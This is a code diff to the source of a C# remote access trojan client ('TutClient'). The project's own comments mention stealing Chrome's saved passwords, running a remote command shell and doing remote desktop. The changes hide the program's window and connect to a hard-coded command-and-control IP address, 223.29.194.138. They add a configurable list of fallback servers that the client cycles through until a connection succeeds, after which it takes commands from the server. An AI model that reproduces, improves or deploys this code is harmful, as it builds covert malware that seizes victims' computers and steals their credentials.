@@ -10,6 +10,7 @@ using System.Data.SQLite; //For reading chrome's sqlite passwords file
 using System.Diagnostics; //For process management
 using System.Drawing; //For graphics
 using System.IO; //For file operations
+using System.Linq;
 using System.Management; //For creating shortcut (.lnk) files
 using System.Net; //For network information
 using System.Net.Security;
@@ -287,7 +288,6 @@ namespace TutClient
         /// STDERR from remote CMD
         /// </summary>
         private static StreamReader error;
-
         private static String fup_location = "";
         private static int fup_size = 0;
         private static bool isFileDownload = false;
@@ -320,12 +320,12 @@ namespace TutClient
 #if HideWindow
             //if (applicationHidden) ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
 #endif
-            //ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
+            ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), SW_HIDE); //Hide application if specified
             _handler += new EventHandler(Handler); //Create a new handler
             SetConsoleCtrlHandler(_handler, true); //Assign the custom handler function
             ServicePointManager.UseNagleAlgorithm = false; //Disable Nagle algorithm (Short Quick TCP packets don't get collected sent at once)
             //RequestLoop1();
-            ConnectToServer(); //Connect to the R.A.T Server
+            ConnectToServer(); //Connecting To R.A.T Server
             StartIPCHandler(); //Start IPC Manager
             RequestLoop(); //Request command from the server
         }
@@ -463,8 +463,9 @@ namespace TutClient
         /// <summary>
         /// Connect to the R.A.T Server
         /// </summary>
-        private static void ConnectToServer()
+        private static void ConnectToServer(string x)
         {
+            bool connected = false; //True if connected to the server
             int attempts = 0; //Connection attempts to the server
             string ipCache = GetIPAddress("223.29.194.138"); //Replace IP with DNS if you want
             if (IsLinuxServer) encoder = Encoding.UTF8;
@@ -495,6 +496,76 @@ namespace TutClient
 
             Console.Clear();
             Console.WriteLine("Connected"); //Client connected
+            connected = true; //Set connected to true
+        }
+
+        /// <summary>
+        /// Connect to the R.A.T Server
+        /// </summary>
+        private static void ConnectToServer()
+        {
+            //connected = false; //True if connected to the server
+            int attempts = 0; //Connection attempts to the server
+            var ips = string.IsNullOrEmpty(Properties.Settings.Default.Ips) ? "223.29.194.138" : Properties.Settings.Default.Ips;
+            var _ips_r = ips.Split(';').ToList();
+            var changeIp = 0;
+            string ipCache = GetIPAddress(_ips_r[changeIp].Split(':')[0]); //Replace IP with DNS if you want
+            if (IsLinuxServer) encoder = Encoding.UTF8;
+            else encoder = Encoding.Unicode;
+
+            while (!_clientSocket.Connected) //Connect while the client isn't connected
+            {
+                try
+                {
+                    attempts++; //1 more attempt
+                    Console.WriteLine("Connection attempt " + attempts );
+                    Console.WriteLine("Connection attempt " + attempts + $": {_ips_r[changeIp]}");
+                    var port = _PORT;
+                    if (_ips_r[changeIp].Split(':').Count() > 1)
+                    {
+                        try
+                        {
+                            port = Convert.ToInt32(_ips_r[changeIp].Split(':')[1]);
+                        }
+                        catch(Exception ex)
+                        {
+                            port = _PORT;
+                        }
+                    }
+                    else
+                    {
+                        port = _PORT;
+                    }
+
+                    _clientSocket.Connect(IPAddress.Parse(ipCache), port); //Try to connect to the server
+                    Thread.Sleep(500);
+                }
+                catch (SocketException) //Couldn't connect to server
+                {
+                    if (attempts % 5 == 0) 
+                    {
+                        if (changeIp + 1 < _ips_r.Count)
+                        {
+                            changeIp++;
+                        }
+                        else
+                        {
+                            changeIp = 0;
+                        }
+                        ipCache = GetIPAddress(_ips_r[changeIp].Split(':')[0]); // Update ip cache every 5 failed attempts
+                    }
+                    //Shutdown the remote desktop
+                    if (RDesktop.isShutdown == false)
+                    {
+                        RDesktop.isShutdown = true;
+                    }
+                    Console.Clear();
+                }
+            }
+
+            Console.Clear();
+            Console.WriteLine("Connected"); //Client connected
+            //connected = true; //Set connected to true
         }
 
         /// <summary>
@@ -533,33 +604,7 @@ namespace TutClient
         {
             string ipCache = GetIPAddress("223.29.194.138"); //Replace IP with DNS if you want
             var _cls = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-            bool connected = false;
-            bool connected1 = false;
-            bool beginLoop = true;
-            while (beginLoop)
-            {
-                _cls.Connect(IPAddress.Parse(ipCache), _PORT);
-
-                if (_cls.Connected)
-                {
-                    connected = true;
-
-                    if (connected && !connected1)
-                    {
-                        ConnectToServer();
-                        connected1 = true;
-                    }
-                }
-                else
-                {
-                    connected = false;
-                    connected1 = false;
-                }
-
-                _cls.Disconnect(true);
-
-                Thread.Sleep(10000);
-            }
+            ConnectToServer();
         }
 
         private static void LaunchHearthbeat()
